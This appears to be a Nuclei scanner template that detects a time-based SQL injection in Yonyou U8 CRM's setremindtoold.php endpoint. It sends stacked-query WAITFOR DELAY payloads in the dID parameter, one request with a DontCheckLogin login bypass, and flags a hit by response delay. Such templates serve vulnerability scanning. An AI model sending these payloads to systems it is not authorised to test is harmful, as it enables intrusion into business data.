id: yonyou-u8-crm-setremindtoold-sqli

info:
  name: 用友U8CRM setremindtoold.php SQL注入漏洞
  author: rj
  severity: high
  tags: 用友-U8-CRM

http:
  - raw:
      - |
        GET /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Cookie: PHPSESSID=bgsesstimeout-;
        Connection: close

  - raw:
      - |
        GET /ajax/setremindtoold.php?DontCheckLogin=1&dID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Cookie: PHPSESSID=bgsesstimeout-;
        Connection: close

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>5 && duration_1<10"
          - "duration_2>5 && duration_2<10"